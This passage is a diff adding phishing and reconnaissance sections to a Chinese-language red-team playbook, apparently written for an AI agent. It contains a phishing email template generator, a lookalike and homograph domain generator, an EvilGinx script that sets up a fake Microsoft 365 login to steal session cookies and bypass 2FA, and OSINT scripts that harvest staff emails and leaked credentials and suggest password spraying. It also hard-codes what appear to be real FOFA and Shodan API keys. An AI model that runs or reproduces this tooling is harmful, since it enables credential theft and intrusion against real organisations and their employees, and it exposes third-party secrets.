+{self.company} Network Security
+""",
+            'timing': 'Any time',
+            'success_rate': '35-40%'
+        }
+    
+    def generate_all(self):
+        """生成所有模板"""
+        templates = {
+            'IT_Password_Expiry': self.it_password_expiry(),
+            'HR_Bonus': self.hr_bonus_notification(),
+            'Security_Alert': self.security_alert(),
+            'DocuSign': self.docusign_signature(),
+            'Finance_Invoice': self.finance_invoice(),
+            'Microsoft365': self.microsoft365_notification(),
+            'VPN_Expiry': self.vpn_account_expiry()
+        }
+        
+        return templates
+
+# 使用
+from datetime import datetime, timedelta
+import random
+
+if __name__ == "__main__":
+    phish = PhishingTemplates("Acme Corporation", "acme.com")
+    templates = phish.generate_all()
+    
+    for name, template in templates.items():
+        print(f"\n{'='*60}")
+        print(f"模板: {name}")
+        print(f"成功率: {template['success_rate']}")
+        print(f"{'='*60}")
+        print(f"主题: {template['subject']}")
+        print(f"发件人: {template['from']}")
+        print(f"\n{template['body']}")
+```
+
+#### 7.2 钓鱼域名生成器
+```python
+#!/usr/bin/env python3
+# 钓鱼域名自动生成（相似域名）
+
+class PhishingDomainGenerator:
+    def __init__(self, target_domain):
+        self.target = target_domain
+    
+    def generate_typosquatting(self):
+        """Typosquatting（拼写错误）"""
+        domains = []
+        
+        # 字符替换
+        replacements = {
+            'o': '0',  # microsoft → micr0soft
+            'i': 'l',  # gmail → gma1l
+            'l': 'i',  # paypal → paypai
+            'a': '@',
+            'e': '3'
+        }
+        
+        for old, new in replacements.items():
+            if old in self.target:
+                domains.append(self.target.replace(old, new))
+        
+        return domains
+    
+    def generate_homograph(self):
+        """同形异义字攻击"""
+        # 使用外观相似的Unicode字符
+        # a → а (西里尔字母)
+        # e → е
+        # o → о
+        homographs = {
+            'a': '\u0430',  # Cyrillic 'a'
+            'e': '\u0435',  # Cyrillic 'e'
+            'o': '\u043e',  # Cyrillic 'o'
+        }
+        
+        domains = []
+        for old, new in homographs.items():
+            if old in self.target:
+                domains.append(self.target.replace(old, new))
+        
+        return domains
+    
+    def generate_combosquatting(self):
+        """Combosquatting（组合域名）"""
+        prefixes = ['secure-', 'login-', 'account-', 'verify-', 'portal-']
+        suffixes = ['-secure', '-login', '-verify', '-portal', '-auth']
+        
+        domains = []
+        for prefix in prefixes:
+            domains.append(prefix + self.target)
+        for suffix in suffixes:
+            domains.append(self.target.replace('.com', suffix + '.com'))
+        
+        return domains
+    
+    def generate_all(self):
+        """生成所有钓鱼域名"""
+        all_domains = []
+        all_domains.extend(self.generate_typosquatting())
+        all_domains.extend(self.generate_homograph())
+        all_domains.extend(self.generate_combosquatting())
+        
+        return list(set(all_domains))
+
+# 使用
+if __name__ == "__main__":
+    gen = PhishingDomainGenerator("microsoft.com")
+    domains = gen.generate_all()
+    
+    print("[+] 钓鱼域名建议:")
+    for domain in domains:
+        print(f"  - {domain}")
+```
+
+#### 7.3 EvilGinx 2FA绕过钓鱼
+```bash
+#!/bin/bash
+# EvilGinx 2FA绕过钓鱼平台部署
+
+# 1. 安装EvilGinx2
+git clone https://github.com/kgretzky/evilginx2
+cd evilginx2
+make
+
+# 2. 配置钓鱼页面
+./evilginx -p phishlets
+
+# 3. 设置Microsoft 365钓鱼
+phishlets hostname o365 login-microsoft.com
+phishlets enable o365
+
+# 4. 创建钓鱼链接
+lures create o365
+lures get-url 0
+
+# 5. 发送钓鱼邮件（使用上面的模板）
+# 受害者登录 → EvilGinx捕获Session Cookie → 绕过2FA
+
+echo "[+] EvilGinx钓鱼平台已启动"
+echo "[+] 钓鱼URL: https://login-microsoft.com/..."
+echo "[+] 等待受害者登录..."
+```
+
+---
+
+### 🔍 增强8：OSINT情报增强（深度挖掘）
+
+**完整OSINT自动化框架（含FOFA/Shodan）**
+
+#### 8.1 全自动OSINT收集
+```python
+#!/usr/bin/env python3
+# 全自动OSINT情报收集工具
+# 集成: FOFA + Shodan + GitHub + LinkedIn + HaveIBeenPwned
+
+import requests
+import json
+import base64
+
+class OSINTFramework:
+    def __init__(self, target_domain, company_name):
+        self.domain = target_domain
+        self.company = company_name
+        
+        # API Keys
+        self.fofa_key = "131d996dd269995c17447746df54b057"
+        self.shodan_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
+        self.hunter_key = "YOUR_HUNTER_IO_KEY"  # 需要注册
+        
+        self.results = {
+            'subdomains': [],
+            'ips': [],
+            'employees': [],
+            'emails': [],
+            'leaked_creds': [],
+            'github_leaks': [],
+            'social_profiles': [],
+            'technologies': []
+        }
+    
+    def collect_subdomains(self):
+        """子域名收集"""
+        print("[+] 收集子域名...")
+        
+        # 1. FOFA查询
+        query = base64.b64encode(f'domain="{self.domain}"'.encode()).decode()
+        url = f"https://fofa.info/api/v1/search/all?key={self.fofa_key}&qbase64={query}&fields=host"
+        
+        try:
+            r = requests.get(url, timeout=30)
+            data = r.json()
+            fofa_subs = [item[0] for item in data.get('results', [])]
+            self.results['subdomains'].extend(fofa_subs)
+        except:
+            pass
+        
+        # 2. 证书透明度
+        crt_url = f"https://crt.sh/?q=%.{self.domain}&output=json"
+        try:
+            r = requests.get(crt_url, timeout=30)
+            certs = r.json()
+            for cert in certs:
+                self.results['subdomains'].append(cert['name_value'])
+        except:
+            pass
+        
+        # 去重
+        self.results['subdomains'] = list(set(self.results['subdomains']))
+        print(f"  [+] 子域名: {len(self.results['subdomains'])}")
+    
+    def collect_ips(self):
+        """IP资产收集"""
+        print("[+] 收集IP资产...")
+        
+        # Shodan查询
+        url = f"https://api.shodan.io/shodan/host/search?key={self.shodan_key}&query=hostname:{self.domain}"
+        
+        try:
+            r = requests.get(url, timeout=30)
+            data = r.json()
+            
+            for match in data.get('matches', []):
+                self.results['ips'].append({
+                    'ip': match.get('ip_str'),
+                    'port': match.get('port'),
+                    'service': match.get('product'),
+                    'os': match.get('os'),
+                    'country': match.get('location', {}).get('country_name')
+                })
+        except:
+            pass
+        
+        print(f"  [+] IP资产: {len(self.results['ips'])}")
+    
+    def collect_employees(self):
+        """员工信息收集（LinkedIn）"""
+        print("[+] 收集员工信息...")
+        
+        # LinkedIn搜索（需要登录或使用API）
+        # 这里提供搜索URL
+        linkedin_urls = [
+            f"https://www.linkedin.com/search/results/people/?keywords={self.company}",
+            f"https://www.linkedin.com/search/results/people/?keywords={self.company}&currentCompany={self.company}"
+        ]
+        
+        print(f"  [!] LinkedIn搜索URL:")
+        for url in linkedin_urls:
+            print(f"    {url}")
+        
+        # 手工收集后，自动生成邮箱格式
+        # 示例员工
+        example_employees = [
+            {'first': 'John', 'last': 'Smith', 'title': 'IT Manager'},
+            {'first': 'Jane', 'last': 'Doe', 'title': 'HR Director'}
+        ]
+        
+        self.results['employees'] = example_employees
+    
+    def generate_emails(self):
+        """生成邮箱列表"""
+        print("[+] 生成邮箱列表...")
+        
+        for emp in self.results['employees']:
+            first = emp['first'].lower()
+            last = emp['last'].lower()
+            
+            # 常见格式
+            formats = [
+                f"{first}.{last}@{self.domain}",
+                f"{first}{last}@{self.domain}",
+                f"{first[0]}{last}@{self.domain}",
+                f"{first}@{self.domain}",
+            ]
+            
+            self.results['emails'].extend(formats)
+        
+        # 通用邮箱
+        generic = [
+            f"admin@{self.domain}",
+            f"info@{self.domain}",
+            f"support@{self.domain}",
+            f"it@{self.domain}",
+            f"hr@{self.domain}"
+        ]
+        self.results['emails'].extend(generic)
+        
+        print(f"  [+] 邮箱: {len(self.results['emails'])}")
+    
+    def check_leaked_credentials(self):
+        """检查历史泄露凭证"""
+        print("[+] 检查历史泄露...")
+        
+        # HaveIBeenPwned API
+        for email in self.results['emails'][:10]:  # 限制查询
+            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
+            headers = {'hibp-api-key': 'YOUR_HIBP_API_KEY'}
+            
+            try:
+                r = requests.get(url, headers=headers, timeout=10)
+                if r.status_code == 200:
+                    breaches = r.json()
+                    self.results['leaked_creds'].append({
+                        'email': email,
+                        'breaches': [b['Name'] for b in breaches]
+                    })
+                    print(f"  [!] 泄露: {email} - {len(breaches)}个数据泄露事件")
+            except:
+                pass
+    
+    def search_github_leaks(self):
+        """GitHub代码泄露搜索"""
+        print("[+] GitHub泄露搜索...")
+        
+        # GitHub搜索关键词
+        keywords = [
+            f'"{self.domain}" password',
+            f'"{self.domain}" api_key',
+            f'"{self.domain}" secret',
+            f'"{self.domain}" token',
+            f'@{self.domain} password'
+        ]
+        
+        for keyword in keywords:
+            search_url = f"https://github.com/search?q={keyword}&type=code"
+            self.results['github_leaks'].append(search_url)
+            print(f"  [!] 搜索: {search_url}")
+    
+    def identify_technologies(self):
+        """技术栈识别"""
+        print("[+] 识别技术栈...")
+        
+        # 使用Shodan获取技术栈
+        for ip_info in self.results['ips'][:10]:
+            ip = ip_info['ip']
+            
+            url = f"https://api.shodan.io/shodan/host/{ip}?key={self.shodan_key}"
+            try:
+                r = requests.get(url, timeout=10)
+                data = r.json()
+                
+                technologies = []
+                for service in data.get('data', []):
+                    if service.get('product'):
+                        technologies.append(service['product'])
+                
+                self.results['technologies'].extend(technologies)
+            except:
+                pass
+        
+        self.results['technologies'] = list(set(self.results['technologies']))
+        print(f"  [+] 技术栈: {', '.join(self.results['technologies'][:10])}")
+    
+    def export_report(self):
+        """生成OSINT报告"""
+        report = f"""
+{'='*60}
+OSINT情报收集报告
+目标: {self.company} ({self.domain})
+生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+{'='*60}
+
+1. 资产统计:
+   - 子域名: {len(self.results['subdomains'])}
+   - IP地址: {len(self.results['ips'])}
+   - 员工: {len(self.results['employees'])}
+   - 邮箱: {len(self.results['emails'])}
+
+2. 安全风险:
+   - 历史泄露: {len(self.results['leaked_creds'])} 个邮箱
+   - GitHub泄露: {len(self.results['github_leaks'])} 个搜索结果
+
+3. 技术栈:
+   {', '.join(self.results['technologies'][:20])}
+
+4. 攻击建议:
+   - 钓鱼目标: {len(self.results['emails'])} 个邮箱
+   - 密码爆破: 使用泄露凭证测试
+   - 子域名打点: {len(self.results['subdomains'])} 个目标
+
+{'='*60}
+"""
+        
+        with open(f'osint_report_{self.domain}.txt', 'w') as f:
+            f.write(report)
+        
+        # JSON格式
+        with open(f'osint_data_{self.domain}.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        print(report)
+    
+    def run(self):
+        """执行完整OSINT收集"""
+        print(f"[+] OSINT情报收集")
+        print(f"[+] 目标: {self.company} ({self.domain})")
+        print("")
+        
+        # 执行所有收集任务
+        self.collect_subdomains()
+        self.collect_ips()
+        self.collect_employees()
+        self.generate_emails()
+        self.check_leaked_credentials()
+        self.search_github_leaks()
+        self.identify_technologies()
+        
+        # 生成报告
+        print("")
+        self.export_report()
+
+# 使用
+if __name__ == "__main__":
+    osint = OSINTFramework("acme.com", "Acme Corporation")
+    osint.run()
+```
+
+#### 8.2 FOFA/Shodan高级查询语法
+```python
+#!/usr/bin/env python3
+# FOFA/Shodan高级查询库
+
+class AdvancedQueries:
+    def __init__(self):
+        self.fofa_key = "131d996dd269995c17447746df54b057"
+        self.shodan_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
+    
+    def fofa_queries(self, target):
+        """FOFA高级查询语法"""
+        queries = {
+            '全部子域名': f'domain="{target}"',
+            'Web应用': f'domain="{target}" && protocol="http"',
+            '管理后台': f'domain="{target}" && (title="admin" || title="管理")',
+            'VPN设备': f'domain="{target}" && (app="Fortinet" || app="Palo-Alto")',
+            '数据库': f'domain="{target}" && (port="3306" || port="1433" || port="5432")',
+            '未授权访问': f'domain="{target}" && status_code="200" && title="Index of"',
+            'Jenkins': f'domain="{target}" && app="Jenkins"',
+            'GitLab': f'domain="{target}" && app="GitLab"',
+            'API文档': f'domain="{target}" && (title="Swagger" || title="API")',
+            '测试环境': f'domain="{target}" && (host="test" || host="dev" || host="staging")'
+        }
+        
+        return queries
+    
+    def shodan_queries(self, target):
+        """Shodan高级查询语法"""
+        queries = {
+            '全部资产': f'hostname:{target}',
+            'Web服务': f'hostname:{target} port:80,443,8080,8443',
+            '数据库': f'hostname:{target} port:3306,1433,5432,27017,6379',
+            'VPN': f'hostname:{target} port:443 ssl.cert.subject.CN:{target}',
+            'K8s集群': f'hostname:{target} port:6443,8443,10250',
+            'Docker': f'hostname:{target} product:Docker',
+            'Elasticsearch': f'hostname:{target} port:9200',
+            'MongoDB': f'hostname:{target} port:27017 -authentication',
+            'Redis': f'hostname:{target} port:6379 -authentication',
+            'AWS资产': f'org:"{target}" cloud.provider:AWS'
+        }
+        
+        return queries
+    
+    def execute_all_queries(self, target):
+        """执行所有查询"""
+        print(f"[+] 执行FOFA/Shodan高级查询")
+        print(f"[+] 目标: {target}")
+        print("")
+        
+        # FOFA查询
+        print("[FOFA查询]")
+        fofa_queries = self.fofa_queries(target)
+        for name, query in fofa_queries.items():
+            query_b64 = base64.b64encode(query.encode()).decode()
+            url = f"https://fofa.info/api/v1/search/all?key={self.fofa_key}&qbase64={query_b64}&size=100"
+            
+            try:
+                r = requests.get(url, timeout=30)
+                data = r.json()
+                count = len(data.get('results', []))
+                print(f"  [{name}] 结果: {count}条")
+            except Exception as e:
+                print(f"  [{name}] 失败: {e}")
+        
+        print("")
+        
+        # Shodan查询
+        print("[Shodan查询]")
+        shodan_queries = self.shodan_queries(target)
+        for name, query in shodan_queries.items():
+            url = f"https://api.shodan.io/shodan/host/search?key={self.shodan_key}&query={query}"
+            
+            try:
+                r = requests.get(url, timeout=30)
+                data = r.json()
+                count = data.get('total', 0)
+                print(f"  [{name}] 结果: {count}条")
+            except Exception as e:
+                print(f"  [{name}] 失败: {e}")
+
+# 使用
+if __name__ == "__main__":
+    queries = AdvancedQueries()
+    queries.execute_all_queries("target.com")
+```
+
+#### 8.3 GitHub代码泄露自动挖掘
+```bash
+#!/bin/bash
+# GitHub代码泄露自动挖掘
+
+TARGET_DOMAIN=$1
+
+echo "[+] GitHub代码泄露搜索"
+echo "[+] 目标: $TARGET_DOMAIN"
+echo ""
+
+# GitHub Dork列表
+DORKS=(
+    "$TARGET_DOMAIN password"
+    "$TARGET_DOMAIN api_key"
+    "$TARGET_DOMAIN secret_key"
+    "$TARGET_DOMAIN aws_access_key"
+    "$TARGET_DOMAIN private_key"
+    "\"$TARGET_DOMAIN\" AND \"password\""
+    "@$TARGET_DOMAIN password"
+    "db_password $TARGET_DOMAIN"
+    "smtp_password $TARGET_DOMAIN"
+    "connectionstring $TARGET_DOMAIN"
+)
+
+# 生成搜索URL
+echo "🔍 GitHub搜索URL:"
+for dork in "${DORKS[@]}"; do
+    ENCODED=$(echo "$dork" | sed 's/ /+/g')
+    echo "https://github.com/search?q=$ENCODED&type=code"
+done
+
+echo ""
+echo "💡 手工检查这些URL，寻找:"
+echo "  - 数据库密码"
+echo "  - API密钥"
+echo "  - SSH私钥"
+echo "  - AWS凭证"
+echo "  - 内部系统地址"
+```
+
+#### 8.4 一键全量OSINT收集
+```bash
+#!/bin/bash
+# 一键全量OSINT收集脚本
+
+TARGET_DOMAIN=$1
+COMPANY_NAME=$2
+OUTPUT_DIR="./osint_$TARGET_DOMAIN"
+mkdir -p "$OUTPUT_DIR"
+
+echo "========================================="
+echo "全量OSINT情报收集"
+echo "目标: $COMPANY_NAME ($TARGET_DOMAIN)"
+echo "========================================="
+echo ""
+
+# 1. 子域名枚举
+echo "[1/8] 子域名枚举..."
+subfinder -d "$TARGET_DOMAIN" -all -o "$OUTPUT_DIR/subdomains.txt"
+amass enum -passive -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/amass_subs.txt"
+cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/all_subdomains.txt"
+
+# 2. IP资产
+echo "[2/8] IP资产收集..."
+cat "$OUTPUT_DIR/all_subdomains.txt" | dnsx -a -resp-only -silent | sort -u > "$OUTPUT_DIR/ips.txt"
+
+# 3. 端口扫描
+echo "[3/8] 端口扫描..."
+naabu -l "$OUTPUT_DIR/ips.txt" -top-ports 1000 -o "$OUTPUT_DIR/ports.txt"
+
+# 4. Web服务识别
+echo "[4/8] Web服务识别..."
+httpx -l "$OUTPUT_DIR/all_subdomains.txt" -title -tech-detect -status-code -cdn -ip -o "$OUTPUT_DIR/web_services.txt"
+
+# 5. 云资产
+echo "[5/8] 云资产检测..."
+python3 cloud_asset_discovery.py "$TARGET_DOMAIN" > "$OUTPUT_DIR/cloud_assets.txt"
+
+# 6. GitHub泄露
+echo "[6/8] GitHub泄露搜索..."
+./github_dork_search.sh "$TARGET_DOMAIN" > "$OUTPUT_DIR/github_leaks.txt"
+
+# 7. 邮箱收集
+echo "[7/8] 邮箱收集..."
+# Hunter.io API（需要key）
+# curl "https://api.hunter.io/v2/domain-search?domain=$TARGET_DOMAIN&api_key=YOUR_KEY" > "$OUTPUT_DIR/emails.json"
+
+# 8. 历史泄露检查
+echo "[8/8] 历史泄露检查..."
+# 检查常见邮箱是否泄露
+
+echo ""
+echo "========================================="
+echo "OSINT收集完成"
+echo "========================================="
+echo "📂 结果目录: $OUTPUT_DIR"
+echo ""
+echo "📊 统计:"
+echo "  子域名: $(wc -l < "$OUTPUT_DIR/all_subdomains.txt")"
+echo "  IP地址: $(wc -l < "$OUTPUT_DIR/ips.txt")"
+echo "  开放端口: $(wc -l < "$OUTPUT_DIR/ports.txt")"
+echo "  Web服务: $(wc -l < "$OUTPUT_DIR/web_services.txt")"
+echo ""
+echo "🎯 下一步:"
+echo "  nuclei -l $OUTPUT_DIR/web_services.txt -t ~/nuclei-templates/ -severity critical,high"
+```
+
+---
+
 ## ⚡ 绝对禁止事项（CRITICAL - 违反立即终止）
 
 ### 🚫 零误报原则（三重验证）
